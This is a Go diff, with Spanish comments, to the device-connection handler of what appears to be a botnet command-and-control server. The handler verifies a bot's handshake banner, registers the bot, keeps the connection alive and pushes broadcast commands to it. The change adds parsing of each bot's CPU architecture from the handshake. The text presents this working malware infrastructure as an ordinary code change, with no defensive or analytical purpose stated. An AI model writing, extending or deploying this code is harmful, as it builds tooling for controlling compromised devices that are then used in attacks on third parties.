@@ -29,67 +29,71 @@ type Client struct {
 	CID     int
 	Version byte
 	Source  string
+	Arch    string // <-- NUEVO: arquitectura del bot
 	Conn    net.Conn
 	Stream  chan []byte
 }
 
 // Handle will handle the new possible device connection.
+
 func Handle(conn net.Conn) {
 	defer conn.Close()
 
 	time.Sleep(1 * time.Second)
-	buffer := make([]byte, 32)
-	i, err := conn.Read(buffer)
-	if err != nil || i > len(buffer) {
+
+	// Leer handshake: 4 bytes banner + 1 byte len + hasta 64 de arquitectura
+	buf := make([]byte, 4+1+64)
+	n, err := conn.Read(buf)
+	if err != nil || n < 5 {
 		return
 	}
 
-	// Ranges through each block verifying its data
-	for pos, block := range Banner {
-		if buffer[pos] != block {
+	// Verificar banner
+	for i, block := range Banner {
+		if i >= n || buf[i] != block {
 			return
 		}
 	}
 
-	var New *Client = &Client{
+	// Leer longitud de la arquitectura
+	archLen := int(buf[4])
+	if archLen < 1 || archLen > 64 || 5+archLen > n {
+		// No hay suficientes datos -> cerrar conexión
+		return
+	}
+	arch := string(buf[5 : 5+archLen])
+
+	// Crear cliente con arquitectura
+	New := &Client{
 		Conn:    conn,
 		Stream:  make(chan []byte),
-		Source:  "unknown",
-		Version: buffer[len(Banner)+1],
-	}
-
-	// Checks for a certain block name
-	if buffer[len(Banner)+1] > 0 {
-		New.Source = string(buffer[len(Banner)+1:])
+		Source:  arch, // también puedes guardarlo en Source si quieres
+		Arch:    arch, // campo específico
+		Version: 0,    // no usamos versión
 	}
 
 	AddClient(New)
 	defer RemoveClient(New)
+
 	ticker := time.NewTicker(time.Second)
 	cancel := make(chan bool)
 	conns := 0
 
 	for {
 		select {
-		case n := <-cancel: // Cancel is triggered when the device connection is closed.
+		case n := <-cancel:
 			if !n {
 				continue
 			}
-
 			return
-
-		case <-ticker.C: // New Check alive command
+		case <-ticker.C:
 			conn.SetReadDeadline(time.Now().Add(120 * time.Second))
 			if conns > 0 {
 				continue
 			}
-
 			go func(conn net.Conn) {
 				conns++
-				defer func() {
-					conns--
-				}()
-
+				defer func() { conns-- }()
 				buf := make([]byte, 1)
 				conn.SetReadDeadline(time.Now().Add(180 * time.Second))
 				if _, err := conn.Read(buf); err != nil {
@@ -102,12 +106,10 @@ func Handle(conn net.Conn) {
 					return
 				}
 			}(conn)
-
-		case broadcast := <-New.Stream: // Send command
+		case broadcast := <-New.Stream:
 			if _, err := conn.Write(broadcast); err != nil {
 				return
 			}
 		}
 	}
-
 }
